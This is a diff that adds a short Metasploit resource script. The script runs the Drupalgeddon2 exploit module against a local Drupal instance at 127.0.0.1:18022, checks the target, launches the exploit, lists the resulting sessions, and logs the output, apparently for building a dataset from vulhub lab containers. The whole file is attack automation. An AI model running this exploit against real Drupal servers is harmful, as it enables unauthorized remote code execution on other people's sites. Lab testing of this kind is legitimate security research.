@@ -1,0 +1,14 @@
+spool /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/scan2.stdout
+use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOSTS 127.0.0.1
+set RPORT 18022
+set TARGETURI /
+set SSL false
+set VERBOSE true
+set AutoCheck true
+check
+run -j
+sleep 20
+sessions
+spool off
+exit
